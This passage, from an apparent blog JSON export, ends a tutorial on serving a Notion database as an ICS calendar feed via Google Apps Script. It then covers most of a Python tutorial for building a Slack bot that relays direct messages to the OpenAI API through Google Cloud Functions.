= \"XXXXX\";function doGet(e) { const ics = HtmlService.createTemplateFromFile('ics'); if (e.parameter.token != safeToken) { return ContentService.createTextOutput(\"Access Denied!\"); } ics.events = getQuickNote(); return ContentService.createTextOutput(ics.evaluate().getContent()).setMimeType(ContentService.MimeType.ICAL);}function debug() { const ics = HtmlService.createTemplateFromFile('ics'); ics.events = getQuickNote(); Logger.log(ics.evaluate().getContent());}function getQuickNote() { // YOUR FILTER Condition: const payload = { \"filter\": { \"and\": [ { \"property\": \"Date\", \"date\": { \"is_not_empty\": true } } , { \"property\": \"Name\", \"title\": { \"is_not_empty\": true } } ] } }; const result = getDatabase(YOUR_DATABASE_ID, payload); var events = []; for (const index in result.results) { const item = result.results[index] const properties = item.properties; const id = item['id']; const create = toICSDate(item[\"created_time\"]); const edit = toICSDate(item[\"last_edited_time\"]); const startDate = properties['Date']['date']['start']; const start = toICSDate(startDate); var endDate = properties['Date']?.['date']?.['end']; if (endDate == null) { endDate = startDate; } const end = toICSDate(endDate); const type = properties['Type']?.['multi_select']?.[0]?.['name']; const title = \"[\"+type+\"] \"+properties?.['Name']?.['title']?.[0]?.['plain_text']; const description = item['url']; events.push( { \"id\":id, \"create\":create, \"edit\":edit, \"start\":start, \"end\":end, \"title\":title, \"description\":description } ) } return events;}// TO UTC Datefunction toICSDate(date) { const icsDate = new Date(date); icsDate.setHours(icsDate.getHours() - 8); return Utilities.formatDate(icsDate, \"GMT+8\", \"yyyyMMdd'T'HHmmss'Z'\");// 20240304T132300Z}// Notionfunction getDatabase(id, payload) { const url = 'https://api.notion.com/v1/databases/'+id+'/query/'; const options = { method: 'post', headers: { 'Authorization': 'Bearer '+notionToken, 'Content-Type': 'application/json', 'Notion-Version': '2022-06-28' }, payload: JSON.stringify(payload) }; const result = UrlFetchApp.fetch(url, options); return JSON.parse(result.getContentText());}ics.html :BEGIN:VCALENDARPRODID:-//Google Inc//Google Calendar 70.9054//ENVERSION:2.0CALSCALE:GREGORIANMETHOD:PUBLISHX-WR-CALNAME:NotionCalendarX-WR-TIMEZONE:Asia/TaipeiBEGIN:VTIMEZONETZID:Asia/TaipeiX-LIC-LOCATION:Asia/TaipeiBEGIN:STANDARDTZOFFSETFROM:+0800TZOFFSETTO:+0800TZNAME:CSTDTSTART:19700101T000000END:STANDARDEND:VTIMEZONE&lt;? for(const eventIndex in events) { const event = events[eventIndex]; ?&gt;BEGIN:VEVENTDTSTART:&lt;?=event[\"start\"]?&gt;DTEND:&lt;?=event[\"end\"]?&gt;DTSTAMP:&lt;?=event[\"edit\"]?&gt;UID:&lt;?=event[\"id\"]?&gt;CREATED:&lt;?=event[\"create\"]?&gt;LAST-MODIFIED:&lt;?=event[\"edit\"]?&gt;SEQUENCE:0STATUS:CONFIRMEDSUMMARY:&lt;?=event[\"title\"]?&gt;DESCRIPTION:&lt;?=event[\"description\"]?&gt;TRANSP:OPAQUEEND:VEVENT&lt;? }?&gt;END:VCALENDARAs before, deploy as a web service by clicking ‚ÄúDeploy‚Äù at the top right of the project -&gt; ‚ÄúNew Deployment‚Äù -&gt; top left ‚ÄúSelect Type‚Äù -&gt; ‚ÄúWeb App‚Äù: Who can access should be set to Everyone, because Google login verification cannot be completed when adding the Calendar.Add the URL to your calendar subscription, done üéâüéâüéâüéâ !Business TimeIf you and your team need automation tools or process integration, whether it‚Äôs Slack App development, Notion, Asana, Google Sheets, Google Forms, GA data, or any other integration, feel free to contact me for development.If you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "Slack & ChatGPT IntegrationÔΩúBuild Custom OpenAI API Slack App with Google Cloud Functions & Python", "url": "/posts/zrealm-dev/slack-chatgpt-integration-build-custom-openai-api-slack-app-with-google-cloud-functions-python-bd94cc88f9c9/", "categories": "ZRealm Dev.", "tags": "english, ai-translation, cloud-functions, ios-app-development, python, chatgpt, slack", "date": "2024-02-16 21:17:01 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Slack &amp; ChatGPT IntegrationBuild Your Own ChatGPT OpenAI API for Slack App...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Slack &amp; ChatGPT IntegrationBuild Your Own ChatGPT OpenAI API for Slack App (Google Cloud Functions &amp; Python)BackgroundRecently, our team has been promoting the use of Generative AI to improve work efficiency. Initially, we aim to implement an AI Assistant (ChatGPT functionality) to reduce the time spent on daily data queries, organizing tedious data, and manual data processing, thereby enhancing productivity. We hope that engineers, designers, PMs, and marketers can all use it freely.The simplest way is to directly purchase the ChatGPT Team plan, which costs $25 per seat per year. However, since the usage frequency and volume are uncertain, and there is a desire to integrate with more external collaboration and development workflows, we chose to use the OpenAI API instead, then package and integrate it through other services for team members.OpenAI API Key can be generated from this page. The Key is not tied to a specific Model version; you need to specify the Model version when using it, which determines the corresponding token cost. We need a service that can set the OpenAI API Key by itself and use that Key for ChatGPT-like interactions. Whether it‚Äôs a Chrome Extension or a Slack App, it‚Äôs quite hard to find services that allow users to set their own OpenAI API Key. Most services sell their own subscription plans, so letting users customize the API Key means they can‚Äôt make money and are essentially doing charity.[Chrome Extension] SidebarGPTAfter installation, go to Settings -&gt; General -&gt; enter your OpenAI API Key.You can directly open the chat interface from the browser toolbar or side icon and use it directly:[Chrome Extension] OpenAI TranslatorIf you only need translation, you can use this. It allows you to customize the OpenAI API Key for translation.Additionally, it is an open-source project and also offers desktop applications for macOS and Windows:The advantage of Chrome Extensions is that they are fast, simple, and convenient‚Äîjust install and use. The downside is that the API Key must be shared with all members, making it hard to control leaks. Additionally, using third-party services makes it difficult to ensure everyone‚Äôs data security.[Self-hosted] LibreChatThe OpenAI API Chat wrapper service recommended by colleagues in the R&amp;D department offers authentication and an open-source project that nearly replicates the ChatGPT interface, with features more powerful than ChatGPT.Just the project, Docker installed, .env configured, and Docker service started are needed to access and use it directly through the website. Tried it out and it‚Äôs flawless, basically a local version of ChatGPT; the only downside is that it requires server deployment; if there are no other concerns, you can directly use this open-source project.Slack AppActually, the LibreChat service works once it‚Äôs deployed on a server, but I thought it would be more convenient if it could be integrated into everyday tools. Plus, the company server has strict permission settings, so running the service freely is difficult.At that time, I didn‚Äôt think much and assumed there would be many Slack apps integrating OpenAI API services, so I just needed to find one and set it up; I didn‚Äôt expect it to be that complicated.Google search only found one official Slack x OpenAI press release from March 2023: ‚ÄúWhy we built the ChatGPT app for Slack‚Äù and some beta images:https://www.salesforce.com/news/stories/chatgpt-app-for-slack/It seems very feature-rich and can greatly improve work efficiency. However, as of January 2024, there is no news of a release. The Beta registration link provided at the end of the article is also no longer valid, with no further updates for now. (Or is Microsoft planning to support Teams first?)[2024/02/14 Update]: See Slack official news; it seems the integration with ChatGPT (OpenAI) has been abandoned or merged into Slack AI.Slack AppsSince there is no official app, I turned to search for third-party developer apps. I tried several but ran into dead ends; not only were there few suitable apps, but none offered a custom key feature. Each one was designed to sell services and make money.Implementing ChatGPT OpenAI API for Slack App by YourselfI had some experience developing Slack apps before, so I decided to give it a try myself. ‚ö†Ô∏èDisclaimer‚ö†Ô∏è This article uses connecting to the OpenAI API as an example to demonstrate how to create a Slack App and quickly use Google Cloud Functions to meet the requirements. Slack Apps have many possible uses, so feel free to explore and customize. ‚ö†Ô∏è‚ö†Ô∏è Google Cloud Functions, a Function as a Service (FaaS), offers advantages such as convenience, speed, free usage tiers, easy deployment after coding, and automatic scaling. However, the service environment is controlled by GCP. If the function is not called for a long time, it goes into a sleep state. When called again, it undergoes a Cold Start, which requires longer response time. It is also more difficult to have multiple services interact with each other. For more comprehensive or high-demand usage, it is still recommended to set up your own VM (App Engine) to host the server and run the service.Final Result Image Complete Cloud Functions Python code and Slack App settings are provided at the end of the article. For those who don‚Äôt want to go through it step by step, feel free to check them out quickly.Step 1. Create a Slack AppGo to Slack App:Click ‚ÄúCreate New App‚ÄùChoose ‚ÄúFrom scratch‚ÄùEnter the ‚ÄúApp Name‚Äù and select the Workspace to add.After creation, go to ‚ÄúOAuth &amp; Permissions‚Äù to add the required permissions for the Bot.Scroll down to the ‚ÄúScopes‚Äù section, click ‚ÄúAdd an OAuth Scope,‚Äù and search to add the following permissions: chat:write im:history im:read im:write After adding Bot permissions, click ‚ÄúInstall App‚Äù on the left -&gt; ‚ÄúInstall to Workspace‚ÄùIf the Slack App adds new permissions in the future, you will need to click ‚ÄúReinstall‚Äù again for them to take effect. But rest assured, the Bot Token will not change due to reinstallation.After setting the Slack Bot Token permissions, go to ‚ÄúApp Home‚Äù:Scroll down to the ‚ÄúShow Tabs‚Äù section, enable the ‚ÄúMessages Tab‚Äù and ‚ÄúAllow users to send Slash commands and messages from the messages tab‚Äù (if this is not checked, you still can‚Äôt send messages, and it will show ‚ÄúSending messages to this app has been turned off.‚Äù).Back in the Slack Workspace, press ‚ÄúCommand+R‚Äù to refresh the screen and see the newly created Slack App and message input box:At this point, sending messages to the app has no functionality.Enable Event Subscriptions featureNext, we need to enable the event subscription feature of the Slack App, which will send an API call to the specified URL when a designated event occurs.Add Google Cloud FunctionsFor the Request URL part, Google Cloud Functions comes into play.After setting up the project and billing information, click ‚ÄúCreate Function‚ÄùFunction name: Enter the project name. Authentication: Select ‚ÄúAllow unauthenticated invocations,‚Äù which means anyone with the URL can access it. If you cannot create a Function or change Authentication, it means your GCP account lacks full Google Cloud Functions permissions. You need to ask your organization administrator to add the Cloud Functions Admin role to your existing identity to use these features.Runtime: Python 3.8 or highermain.py :import functions_framework@functions_framework.httpdef hello_http(request): request_json = request.get_json(silent=True) request_args = request.args request_headers = request.headers # You can simply use print to log runtime information, which can be viewed in Logs # For advanced logging levels, refer to: https://cloud.google.com/logging/docs/reference/libraries print(request_json) # Due to FAAS (Cloud Functions) limitations, if the service is not called for a long time, the next call triggers a cold start, # which might not respond within Slack's 3-second requirement # Plus, OpenAI API requests and responses take some time (depending on response length, it may take nearly 1 minute) # If Slack does not receive a response within the time limit, it considers the request lost and retries # This causes duplicate requests and responses, so we can set X-Slack-No-Retry: 1 in Response Headers to tell Slack not to retry even if no timely response is received headers = {'X-Slack-No-Retry':1} # Ignore Slack Retry requests... if request_headers and 'X-Slack-Retry-Num' in request_headers: return ('OK!', 200, headers) # Slack App Event Subscriptions Verify # https://api.slack.com/events/url_verification if request_json and 'type' in request_json and request_json['type'] == 'url_verification': challenge = \"\" if 'challenge' in request_json: challenge = request_json['challenge'] return (challenge, 200, headers) return (\"Access Denied!\", 400, headers)requirements.txt Enter the following dependencies:functions-framework==3.*requests==2.31.0openai==1.9.0Currently, there are no features yet. It only allows the Slack App to enable verification through Event Subscriptions. You can directly click ‚ÄúDeploy‚Äù to complete the initial deployment. ‚ö†Ô∏èIf you are not familiar with the Cloud Functions editor, you can scroll down to the bottom of the article to see additional information.After the deployment is complete (green checkmark), copy the Cloud Functions URL:Paste the Request URL back into the Slack App Enable Events.If there are no issues, ‚ÄúVerified‚Äù will appear to complete the verification.This part handles receiving verification requests sent from Slack:{ \"token\": \"Jhj5dZrVaK7ZwHHjRyZWjbDl\", \"challenge\": \"3eZbrw1aBm2rZgRNFdxV2595E9CY3gmdALWMmHkvFXO7tYXAYM8P\", \"type\": \"url_verification\"}Respond to the content in the challenge field to pass the verification.After successful activation, scroll down to the ‚ÄúSubscribe to bot events‚Äù section and click ‚ÄúAdd Bot User Event‚Äù to add the ‚Äúmessage.im‚Äù permission.After granting full permissions, click the ‚Äúreinstall your app‚Äù link above to reinstall the Slack App to your Workspace. This completes the Slack App setup.You can also go to ‚ÄúApp Home‚Äù or ‚ÄúBasic Information‚Äù to customize the Slack App‚Äôs name and avatar.Basic InformationStep 2. Improve OpenAI API and Slack App Integration (Direct Messages)First, we need to obtain the required OPENAI API KEY and Bot User OAuth Token. OPENAI API KEY: OpenAI API key page . Bot User OAuth Token Ôºö OAuth Tokens for Your WorkspaceHandling Direct Message (IM) Event &amp; Integrating OpenAI API ResponseWhen a user sends a message with the Slack App, the following Event JSON Payload is received:{ \"token\": \"XXX\", \"team_id\": \"XXX\", \"context_team_id\": \"XXX\", \"context_enterprise_id\": null, \"api_app_id\": \"XXX\", \"event\": { \"client_msg_id\": \"XXX\", \"type\": \"message\", \"text\": \"Hello\", \"user\": \"XXX\", \"ts\": \"1707920753.115429\", \"blocks\": [ { \"type\": \"rich_text\", \"block_id\": \"orfng\", \"elements\": [ { \"type\": \"rich_text_section\", \"elements\": [ { \"type\": \"text\", \"text\": \"Hello\" } ] } ] } ], \"team\": \"XXX\", \"channel\": \"XXX\", \"event_ts\": \"1707920753.115429\", \"channel_type\": \"im\" }, \"type\": \"event_callback\", \"event_id\": \"XXX\", \"event_time\": 1707920753, \"authorizations\": [ { \"enterprise_id\": null, \"team_id\": \"XXX\", \"user_id\": \"XXX\", \"is_bot\": true, \"is_enterprise_install\": false } ], \"is_ext_shared_channel\": false, \"event_context\": \"4-XXX\"}Based on the above Json Payload, we can complete the integration from Slack message to OpenAI API and then back to replying to the Slack message:Cloud Functions main.py Ôºöimport functions_frameworkimport requestsimport asyncioimport jsonimport timefrom openai import AsyncOpenAIOPENAI_API_KEY = \"OPENAI API KEY\"SLACK_BOT_TOKEN = \"Bot User OAuth Token\"# The OPENAI API Model used# https://platform.openai.com/docs/modelsOPENAI_MODEL = \"gpt-4-1106-preview\"@functions_framework.httpdef hello_http(request): request_json = request.get_json(silent=True) request_args = request.args request_headers = request.headers # You can simply use print to record runtime logs, viewable in Logs # For advanced logging levels, see: https://cloud.google.com/logging/docs/reference/libraries print(request_json) # Due to FAAS (Cloud Functions) constraints, if the service is idle for too long, it enters cold start, # which may prevent responding within Slack's 3-second limit. # Also, OpenAI API requests take time to complete (up to nearly 1 minute depending on response length). # Slack considers the request lost if no response is received within the limit and retries. # This causes duplicate requests and responses, so we set X-Slack-No-Retry: 1 in the response headers # to tell Slack not to retry even if no timely response is received. headers = {'X-Slack-No-Retry':1} # Ignore Slack retry requests... if request_headers and 'X-Slack-Retry-Num' in request_headers: return ('OK!', 200, headers) # Slack App Event Subscriptions Verify # https://api.slack.com/events/url_verification if request_json and 'type' in request_json and request_json['type'] == 'url_verification': challenge = \"\" if 'challenge' in request_json: challenge = request_json['challenge'] return (challenge, 200, headers) # Handle Event Subscriptions Events... if request_json and 'event' in request_json and 'type' in request_json['event']: # If the event source is the app itself and app ID matches Slack App ID, # ignore to avoid infinite loops Slack App -&gt; Cloud Functions -&gt; Slack App -&gt; Cloud Functions... if 'api_app_id' in request_json and 'app_id' in request_json['event'] and request_json['api_app_id'] == request_json['event']['app_id']: return ('OK!', 200, headers) # Event name, e.g., message (related to messages), app_mention (being mentioned)... eventType = request_json['event']['type'] # SubType, e.g., message_changed (edited message), message_deleted (deleted message)... # New messages have no SubType eventSubType = None if 'subtype' in request_json['event']: eventSubType = request_json['event']['subtype'] if eventType == 'message': # SubTypes are message edits, deletions, replies... # Ignore these if eventSubType is not None: return (\"OK!\", 200, headers) # Sender of the event message eventUser = request_json['event']['user'] # Channel of the event message eventChannel = request_json['event']['channel'] # Content of the event message eventText = request_json['event']['text'] # Timestamp (ID) of the event message eventTS = request_json['event']['event_ts'] # Parent message timestamp (ID) of the event message's thread # Only present for messages inside threads eventThreadTS = None if 'thread_ts' in request_json['event']: eventThreadTS = request_json['event']['thread_ts'] openAIRequest(eventChannel, eventTS, eventThreadTS, eventText) return (\"OK!\", 200, headers) return (\"Access Denied!\", 400, headers)def openAIRequest(eventChannel, eventTS, eventThreadTS, eventText): # Set Custom instructions # Thanks to colleague (https://twitter.com/je_suis_marku) for support messages = [ {\"role\": \"system\", \"content\": \"I only understand Traditional Chinese (Taiwan) and English.\"}, {\"role\": \"system\", \"content\": \"I do not understand Simplified Chinese.\"}, {\"role\": \"system\", \"content\": \"If I speak Chinese, I reply in Traditional Chinese (Taiwan) and use common Taiwanese phrases.\"}, {\"role\": \"system\", \"content\": \"If I speak English, I reply in English.\"}, {\"role\": \"system\", \"content\": \"Do not respond with greetings or small talk.\"}, {\"role\": \"system\", \"content\": \"There should be a space between Chinese and English. There should also be a space between Chinese characters and any other language characters including numbers and emoji.\"}, {\"role\": \"system\", \"content\": \"If you don't know the answer or your knowledge is outdated, please search online before replying.\"}, {\"role\": \"system\", \"content\": \"I will tip you 200 USD, if you answer well.\"} ] messages.append({ \"role\": \"user\", \"content\": eventText }) replyMessageTS = slackRequestPostMessage(eventChannel, eventTS, \"Generating response...\") asyncio.run(openAIRequestAsync(eventChannel, replyMessageTS, messages))async def openAIRequestAsync(eventChannel, eventTS, messages): client = AsyncOpenAI( api_key=OPENAI_API_KEY, ) # Stream Response (partial response) stream = await client.chat.completions.create( model=OPENAI_MODEL, messages=messages, stream=True, ) result = \"\" try: debounceSlackUpdateTime = None async for chunk in stream: result += chunk.choices[0].delta.content or \"\" # Update message every 0.8 seconds to avoid frequent Slack Update API calls that may fail or waste Cloud Functions calls if debounceSlackUpdateTime is None or time.time() - debounceSlackUpdateTime &gt;= 0.8: response = slackUpdateMessage(eventChannel, eventTS, None, result+\"...\") debounceSlackUpdateTime = time.time() except Exception as e: print(e) result += \"...*[Error occurred]*\" slackUpdateMessage(eventChannel, eventTS, None, result)### Slack ###def slackUpdateMessage(channel, ts, metadata, text): endpoint = \"/chat.update\" payload = { \"channel\": channel, \"ts\": ts } if metadata is not None: payload['metadata'] = metadata payload['text'] = text response = slackRequest(endpoint, \"POST\", payload) return responsedef slackRequestPostMessage(channel, target_ts, text): endpoint = \"/chat.postMessage\" payload = { \"channel\": channel, \"text\": text, } if target_ts is not None: payload['thread_ts'] = target_ts response = slackRequest(endpoint, \"POST\", payload) if response is not None and 'ts' in response: return response['ts'] return Nonedef slackRequest(endpoint, method, payload): url = \"https://slack.com/api\"+endpoint headers = { \"Authorization\": f\"Bearer {SLACK_BOT_TOKEN}\", \"Content-Type\": \"application/json\", } response = None if method == \"POST\": response = requests.post(url, headers=headers, data=json.dumps(payload)) elif method == \"GET\": response = requests.post(url, headers=headers) if response and response.status_code == 200: result = response.json() return result else: return NoneBack to Slack for testing:You can now perform ChatGPT-like Q&amp;A using the OpenAI API.Add Interrupt Stream Response Feature to Save TokensThere are many ways to implement this. For example, if the user sends a new message in the same thread before the previous response is finished, the previous response can be interrupted. Alternatively, clicking the message can trigger a shortcut to interrupt the response.This article uses the addition of the ‚ÄúMessage Interrupt‚Äù Shortcut as an example.No matter which interruption method is used, the core principle is the same because we do not have a database to store generated messages or message status information. Therefore, the implementation relies on Slack message metadata fields (which can store custom information within specific messages).When using the chat.update API Endpoint, a successful call returns the current message text and metadata. Therefore, in the above OpenAI API Stream -&gt; Slack Update Message code, we added a check to see if the metadata in the update response contains a ‚Äústop‚Äù marker. If it does, the OpenAI Stream Response is interrupted.First, you need to add a Slack App message ShortcutGo to the Slack App management interface, find the ‚ÄúInteractivity &amp; Shortcuts‚Äù section, click to enable it, and use the same Cloud Functions URL.Click ‚ÄúCreate New Shortcut‚Äù to add a new message Shortcut.Select ‚ÄúOn messages‚Äù. Name Action Title: Stop OpenAI API from Generating Response Short Description: Stop OpenAI API from generating responses Callback ID: abort_openai_api (Program identifier, customizable) After clicking ‚ÄúCreate‚Äù to complete, remember to click ‚ÄúSave Changes‚Äù at the bottom right to save the settings.Click ‚Äúreinstall your app‚Äù above again to take effect.Back in Slack, clicking the ‚Äú‚Ä¶‚Äù at the top right of a message will show the ‚ÄúStop OpenAI API Response‚Äù shortcut (clicking it at this time has no effect).When the user taps the Shortcut on the message, an Event Json Payload will be sent:{ \"type\": \"message_action\", \"token\": \"XXXXXX\", \"action_ts\": \"1706188005.387646\", \"team\": { \"id\": \"XXXXXX\", \"domain\": \"XXXXXX-XXXXXX\" }, \"user\": { \"id\": \"XXXXXX\", \"username\": \"zhgchgli\", \"team_id\": \"XXXXXX\", \"name\": \"zhgchgli\" }, \"channel\": { \"id\": \"XXXXXX\", \"name\": \"directmessage\" }, \"is_enterprise_install\": false, \"enterprise\": null, \"callback_id\": \"abort_openai_api\", \"trigger_id\": \"XXXXXX\", \"response_url\": \"https://hooks.slack.com/app/XXXXXX/XXXXXX/XXXXXX\", \"message_ts\": \"1706178957.161109\", \"message\": { \"bot_id\": \"XXXXXX\", \"type\": \"message\", \"text\": \"The English translation of È´òÈ∫óËèúÂåÖ is \\\"cabbage wrap.\\\" If you use it as a dish name, sometimes the name specifies the contents, such as \\\"pork cabbage wrap\\\" or \\\"vegetable cabbage wrap.\\\"\", \"user\": \"XXXXXX\", \"ts\": \"1706178957.161109\", \"app_id\": \"XXXXXX\", \"blocks\": [ { \"type\": \"rich_text\", \"block_id\": \"eKgaG\", \"elements\": [ { \"type\": \"rich_text_section\", \"elements\": [ { \"type\": \"text\", \"text\": \"The English translation of È´òÈ∫óËèúÂåÖ is \\\"cabbage wrap.\\\" If you use it as a dish name, sometimes the name specifies the contents, such as \\\"pork cabbage wrap\\\" or \\\"vegetable cabbage wrap.\\\"\" } ] } ] } ], \"team\": \"XXXXXX\", \"bot_profile\": { \"id\": \"XXXXXX\", \"deleted\": false, \"name\": \"Rick C-137\", \"updated\": 1706001605, \"app_id\": \"XXXXXX\", \"icons\": { \"image_36\": \"https://avatars.slack-edge.com/2024-01-23/6517244582244_0c708dfa3f893c72d4c2_36.png\", \"image_48\": \"https://avatars.slack-edge.com/2024-01-23/6517244582244_0c708dfa3f893c72d4c2_48.png\", \"image_72\": \"https://avatars.slack-edge.com/2024-01-23/6517244582244_0c708dfa3f893c72d4c2_72.png\" }, \"team_id\": \"XXXXXX\" }, \"edited\": { \"user\": \"XXXXXX\", \"ts\": \"1706187989.000000\" }, \"thread_ts\": \"1706178832.102439\", \"parent_user_id\": \"XXXXXX\" }}Improve Cloud Functions main.py:import functions_frameworkimport requestsimport asyncioimport jsonimport timefrom openai import AsyncOpenAIOPENAI_API_KEY = \"OPENAI API KEY\"SLACK_BOT_TOKEN = \"Bot User OAuth Token\"# The OPENAI API Model used# https://platform.openai.com/docs/modelsOPENAI_MODEL = \"gpt-4-1106-preview\"@functions_framework.httpdef hello_http(request): request_json = request.get_json(silent=True) request_args = request.args request_headers = request.headers # Shortcut events come from the post payload field # https://api.slack.com/reference/interaction-payloads/shortcuts payload = request.form.get('payload') if payload is not None: payload = json.loads(payload) # You can simply use print to log runtime logs, viewable in Logs # For advanced logging levels, refer to: https://cloud.google.com/logging/docs/reference/libraries print(payload) # Due to FAAS (Cloud Functions) limitations, if the service is idle for too long, the next call triggers a cold start, # which may fail to respond within Slack's 3-second limit. # Also, OpenAI API requests take time to complete (up to nearly 1 minute depending on response length). # Slack considers requests lost if no response within the limit and retries the request. # This causes duplicate requests and responses, so we set 'X-Slack-No-Retry: 1' in response headers to tell Slack not to retry even if no timely response. headers = {'X-Slack-No-Retry':1} # Ignore Slack retry requests... if request_headers and 'X-Slack-Retry-Num' in request_headers: return ('OK!', 200, headers) # Slack App Event Subscriptions Verify # https://api.slack.com/events/url_verification if request_json and 'type' in request_json and request_json['type'] == 'url_verification': challenge = \"\" if 'challenge' in request_json: challenge = request_json['challenge'] return (challenge, 200, headers) # Handle Event Subscriptions Events... if request_json and 'event' in request_json and 'type' in request_json['event']: # If the event source is the app itself and app ID matches Slack App ID, ignore to avoid infinite loops Slack App -&gt; Cloud Functions -&gt; Slack App -&gt; Cloud Functions... if 'api_app_id' in request_json and 'app_id' in request_json['event'] and request_json['api_app_id'] == request_json['event']['app_id']: return ('OK!', 200, headers) # Event name, e.g., message (related to messages), app_mention (mentioned)... eventType = request_json['event']['type'] # SubType, e.g., message_changed (edited message), message_deleted (deleted message)... # New messages have no SubType eventSubType = None if 'subtype' in request_json['event']: eventSubType = request_json['event']['subtype'] if eventType == 'message': # SubTypes are message edits, deletions, replies... # Ignore and do not process if eventSubType is not None: return (\"OK!\", 200, headers) # Event message sender eventUser = request_json['event']['user'] # Event message channel eventChannel = request_json['event']['channel'] # Event message content eventText = request_json['event']['text'] # Event message TS (message ID) eventTS = request_json['event']['event_ts'] # Event thread parent message TS (message ID) # Only new messages in threads have this data eventThreadTS = None if 'thread_ts' in request_json['event']: eventThreadTS = request_json['event']['thread_ts'] openAIRequest(eventChannel, eventTS, eventThreadTS, eventText) return (\"OK!\", 200, headers) # Handle Shortcut if payload and 'type' in payload: payloadType = payload['type'] # If it's a message shortcut if payloadType == 'message_action': print(payloadType) callbackID = None channel = None ts = None text = None triggerID = None if 'callback_id' in payload: callbackID = payload['callback_id'] if 'channel' in payload: channel = payload['channel']['id'] if 'message' in payload: ts = payload['message']['ts'] text = payload['message']['text'] if 'trigger_id' in payload: triggerID = payload['trigger_id'] if channel is not None and ts is not None and text is not None: # If it's the shortcut to stop OpenAI API response generation if callbackID == \"abort_openai_api\": slackUpdateMessage(channel, ts, {\"event_type\": \"aborted\", \"event_payload\": { }}, text) if triggerID is not None: slackOpenModal(triggerID, callbackID, \"Successfully stopped OpenAI API response generation!\") return (\"OK!\", 200, headers) return (\"OK!\", 200, headers) return (\"Access Denied!\", 400, headers)def openAIRequest(eventChannel, eventTS, eventThreadTS, eventText): # Set Custom instructions # Thanks to colleague (https://twitter.com/je_suis_marku) for support messages = [ {\"role\": \"system\", \"content\": \"I only understand Traditional Chinese (Taiwan) and English.\"}, {\"role\": \"system\", \"content\": \"I do not understand Simplified Chinese.\"}, {\"role\": \"system\", \"content\": \"If I speak Chinese, I will respond in Traditional Chinese used in Taiwan.\"}, {\"role\": \"system\", \"content\": \"If I speak English, I will respond in English.\"}, {\"role\": \"system\", \"content\": \"Do not respond with greetings.\"}, {\"role\": \"system\", \"content\": \"There should be a space between Chinese and English. There should be a space between Chinese text and any other language characters including numbers and emoji.\"}, {\"role\": \"system\", \"content\": \"If you don't know the answer or your knowledge is outdated, please search online before answering.\"}, {\"role\": \"system\", \"content\": \"I will tip you 200 USD, if you answer well.\"} ] messages.append({ \"role\": \"user\", \"content\": eventText }) replyMessageTS = slackRequestPostMessage(eventChannel, eventTS, \"Generating response...\") asyncio.run(openAIRequestAsync(eventChannel, replyMessageTS, messages))async def openAIRequestAsync(eventChannel, eventTS, messages): client = AsyncOpenAI( api_key=OPENAI_API_KEY, ) # Stream Response (chunked response) stream = await client.chat.completions.create( model=OPENAI_MODEL, messages=messages, stream=True, ) result = \"\" try: debounceSlackUpdateTime = None async for chunk in stream: result += chunk.choices[0].delta.content or \"\" # Update message every 0.8 seconds to avoid frequent Slack Update API calls causing failures or wasting Cloud Functions requests if debounceSlackUpdateTime is None or time.time() - debounceSlackUpdateTime &gt;= 0.8: response = slackUpdateMessage(eventChannel, eventTS, None, result+\"...\") debounceSlackUpdateTime = time.time() # If message has metadata &amp; metadata event_type == aborted, it means user marked this response as terminated if response and 'ok' in response and response['ok'] == True and 'message' in response and 'metadata' in response['message'] and 'event_type' in response['message']['metadata'] and response['message']['metadata']['event_type'] == \"aborted\": break result += \"...*[Terminated]*\" # Message was deleted elif response and 'ok' in response and response['ok'] == False and 'error' in response and response['error'] == \"message_not_found\" : break await stream.close() except Exception as e: print(e) result += \"...*[Error occurred]*\" slackUpdateMessage(eventChannel, eventTS, None, result)### Slack ###def slackOpenModal(trigger_id, callback_id, text): slackRequest(\"/views.open\", \"POST\", { \"trigger_id\": trigger_id, \"view\": { \"type\": \"modal\", \"callback_id\": callback_id, \"title\": { \"type\": \"plain_text\", \"text\": \"Notice\" }, \"blocks\": [ { \"type\": \"section\", \"text\": { \"type\": \"mrkdwn\", \"text\": text } } ] } })def slackUpdateMessage(channel, ts, metadata, text): endpoint = \"/chat.update\" payload = { \"channel\": channel, \"ts\": ts } if metadata is not None: payload['metadata'] = metadata payload['text'] = text response = slackRequest(endpoint, \"POST\", payload) return responsedef slackRequestPostMessage(channel, target_ts, text): endpoint = \"/chat.postMessage\" payload = { \"channel\": channel, \"text\": text, } if target_ts is not None: payload['thread_ts'] = target_ts response = slackRequest(endpoint, \"POST\", payload) if response is not None and 'ts' in response: return response['ts'] return Nonedef slackRequest(endpoint, method, payload): url = \"https://slack.com/api\"+endpoint headers = { \"Authorization\": f\"Bearer {SLACK_BOT_TOKEN}\", \"Content-Type\": \"application/json\", } response = None if method == \"POST\": response = requests.post(url, headers=headers, data=json.dumps(payload)) elif method == \"GET\": response = requests.post(url, headers=headers) if response and response.status_code == 200: result = response.json() return result else: return NoneBack to Slack to test:Success! When we complete the Stop OpenAI API Shortcut, the ongoing response will be terminated and respond with [Terminated]. Similarly, using the same principle, you can create a Shortcut to delete messages, implementing the deletion of messages sent by the Slack App.Add Context Feature Within the Same Discussion Thread (Threads)If you send a new message in the same thread, it can be treated as a follow-up question to the original issue. At this point, a feature can be added to append the previous conversation to the new prompt.Add slackGetReplies &amp; Fill Content into OpenAI API Prompt:Improve Cloud Functions main.py:import functions_frameworkimport requestsimport asyncioimport jsonimport timefrom openai import AsyncOpenAIOPENAI_API_KEY = \"OPENAI API KEY\"SLACK_BOT_TOKEN = \"Bot User OAuth Token\"# OPENAI API Model used# https://platform.openai.com/docs/modelsOPENAI_MODEL = \"gpt-4-1106-preview\"@functions_framework.httpdef hello_http(request): request_json = request.get_json(silent=True) 